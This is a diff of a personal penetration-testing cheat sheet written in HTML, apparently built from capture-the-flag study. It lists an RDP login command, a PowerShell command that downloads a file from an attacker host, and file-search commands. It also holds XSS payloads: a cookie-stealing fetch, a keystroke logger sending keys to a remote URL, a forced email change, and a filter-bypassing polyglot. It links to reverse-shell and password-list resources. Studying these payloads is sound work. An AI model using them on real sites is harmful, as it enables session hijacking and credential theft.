@@ -1,4 +1,5 @@
-# pentesting_time
+ <h1 align='center'> Penetration time</h1>
+
 <h1>My pentesting cheat sheet, where I share "hotkey" tools and the same things.</h1>
 There is a :
 <ol>
@@ -11,29 +12,35 @@ There is a :
   	<li> shells!-->
 </ol>
 
-<h2 id='n1'><em>Commands</em></h2> 
+<h2 align='center' id='n1'><em>Commands</em></h2> 
 <h3>Remote Desktop Protocol (rdp)</h3>
-  xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;MACHINE_IP> /u:&lt;User> /p:&lt;'Password'>
-  <p>xfreerdp /v:&lt;IP> /u:User /p:Password +clipboard
+  <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;MACHINE_IP> /u:&lt;User> /p:&lt;'Password'></code>
+  <p><code>xfreerdp /v:&lt;IP> /u:&lt;Username> /p:&lt;Password> +clipboard<></code>
 	
 <h3>To get stable shell from unstable from PowerShell</h3>
-  powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"
+  <code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"</code>
+  
+<h3>Commands to find in:</h3>
+<h4>Linux</h4>
+	<p> <code>find / -type f</code> - Find all files in / directory
+	<p> <code>find / -type f | grep 'flag'</code> - Find all files with 'flag' in file name
+	<p> <code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code> - Find all path files with ‘config’ 
 
-<h2 id='n2'><em>Payloads</em></h2>
+<h2 align='center' id='n2'><em>Payloads</em></h2>
     <h3>XSS Payloads</h3>
-    <li> <b>Proof Of Concept (PoC)</b> - <script>alert('Success XSS!');</script>
+    <li> <b>Proof Of Concept (PoC)</b> - <code><script>alert('Success XSS!');</script></code>
       <p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
-    <li> <b>Session Srealing</b> - <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script>
+    <li> <b>Session Srealing</b> - <code><script>fetch('url/steal?cookie=' + btoa(document.cookie));</script></code>
       <p>Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
-    <li> <b>Key Logger</b> - <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script>
+    <li> <b>Key Logger</b> - <code><scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script></code>
       <p>The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
-    <li> <b>Business Logic</b> -  <script>user.changeEmail('your@email.com');</script>
+    <li> <b>Business Logic</b> - <code><script>user.changeEmail('your@email.com');</script></code>
       <p>This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
-    <li><b>Polyglots</b> - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e
+    <li><b>Polyglots</b> - <code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e</code>
       <p>An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
 	      
         
-<h2 id='n3'><em>Sites</em></h2>
+<h2 align='center' id='n3'><em>Sites</em></h2>
       <li> <a href='https://crackstation.net/'>crackstation.net</a> - online password hash cracker
       <li> <a href='https://www.base64encode.org/'>Base64</a> encode/decode
       <li> <a href='https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'>Reverse Shell Cheat Sheet</a>
@@ -50,7 +57,7 @@ There is a :
       <li> <a href='https://wiki.skullsecurity.org/index.php?title=Passwords'>This</a> wiki page includes the most well-known collections of passwords.
 	      
         
-<h2 id='n4'><em>Tools</em></h2>
+<h2 align='center' id='n4'><em>Tools</em></h2>
 	<ol>
 		<li><h3><a href='https://www.kali.org/tools/ncurses-hexedit/'>Hexeditor</a></h3>
 	        	<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'>Link</a> to Wiki with List of file signatures. 
